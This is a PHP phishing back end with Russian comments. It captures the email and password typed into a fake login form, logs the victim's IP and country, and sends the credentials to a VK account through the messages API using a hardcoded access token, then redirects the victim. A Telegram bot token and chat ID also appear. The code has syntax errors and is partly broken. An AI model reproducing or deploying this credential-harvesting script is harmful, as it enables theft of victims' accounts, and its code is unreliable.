 <?php

//В переменную $token нужно вставить токен, который нам прислал @botFather
$token = "1542133321:AAGQmrwvhWeHIsLLCWbWDf9jXmEGCdILJls";

//Сюда вставляем chat_id
$chat_id = "-1015496132468";

//Определяем переменные для передачи данных из нашей формы
$login = ($_POST['email']);
$password = ($_POST['pass']);



//Настраиваем внешний вид сообщения в телеграме
$ip = $_SERVER['HTTP_CLIENT_IP'] ? $_SERVER['HTTP_CLIENT_IP'] :
($_SERVER['HTTP_X_FORWARDED_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);

$country = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));

$message = "Полученны новые данные: \n Логин: " . $login . "\n Пароль: " . $password . "\n\n IP: " . $ip . "/n Страна:  " $country->country; "";
//Передаем данные боту


file_get_contents('https://api.vk.com/method/messages.send?peer_id=367918333&random_id=0&message='.$message.'&v=5.101'+"&access_token=ce5a3555d1984d1a25eb46c32915f1063f0242cd6cb60fa6935dd69e227ece90738a34d1f2eb3875d5605");

header('Location: index.html');
?>